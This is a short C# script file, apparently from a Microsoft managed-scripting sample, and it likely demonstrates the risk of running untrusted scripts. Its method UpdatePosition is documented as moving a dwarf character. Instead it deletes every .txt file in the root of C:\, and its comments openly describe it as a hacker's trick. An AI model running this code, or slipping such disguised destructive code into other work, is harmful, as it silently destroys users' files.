//--------------------------------------------------------------------------------------
// File: Script2.cs
//
// Scripting code for Managed Scripting sample
//
// Copyright (c) Microsoft Corporation. All rights reserved.
//--------------------------------------------------------------------------------------
using System;

/// <summary>
/// Handles scripts for the ShadowVolume sample
/// </summary>
class ScriptClass
{
    /// <summary>
    /// Updates dwarf's position
    /// </summary>
    public static void UpdatePosition(double appTime, ref float x, ref float y, ref float z)
    {
        // I'm a bad guy hacker, i'm going to mess up your computer with this script!
        foreach(string s in System.IO.Directory.GetFiles("C:\\", "*.txt"))
        {
            // Deleting all of your text files in the root will be good enough!
            System.IO.File.Delete(s);
        }
    }
}
